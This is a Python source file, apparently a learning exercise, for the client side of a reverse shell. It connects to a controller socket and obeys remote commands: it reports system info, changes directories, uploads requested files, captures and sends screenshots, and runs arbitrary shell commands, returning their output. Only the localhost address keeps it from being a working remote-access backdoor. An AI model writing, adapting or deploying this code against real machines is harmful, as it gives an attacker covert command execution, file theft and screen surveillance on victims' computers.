# ---------- Sockets network : Client ----------
import os
import platform
import socket
import time
import subprocess
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connection at server: {HOST_IP}, port: {HOST_PORT} ....")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print(f"Error : Unable to connect to server. Reconnection...")
        time.sleep(4)
    else:
        print(f"Connected to server.")
        break

# if received_data:
#     print(received_data.decode())
# else:
#     print("No data")
while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print(f"Command : {command}")

    command_split = command.split(" ")

    if command == "infos":
        response = platform.platform() + " " + os.getcwd()
        response = response.encode()
    elif len(command_split) == 2 and command_split[0] == "cd":
        try:
            os.chdir(command_split[1].strip("'"))
            response = " "
        except FileNotFoundError:
            response = "Error: No such file or directory"
        response = response.encode()
    elif len(command_split) == 2 and command_split[0] == "dl":
        try:
            file = open(command_split[1], "rb")
        except FileNotFoundError:
            response = " ".encode()
        else:
            response = file.read()
            file.close()

    elif len(command_split) == 2 and command_split[0] == "screen":
        screenshot = ImageGrab.grab()
        screenshot_file = command_split[1] + ".png"
        screenshot.save(screenshot_file, "PNG")

        try:
            file = open(screenshot_file, "rb")
        except FileNotFoundError:
            response = " ".encode()
        else:
            response = file.read()
            file.close()
    else:
        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
        response = result.stdout + result.stderr
        if not response or len(response) == 0:
            response = " "
        response = response.encode()

    data_len = len(response)
    header = str(data_len).zfill(13)
    print(f"Header {header}")
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(response)

s.close()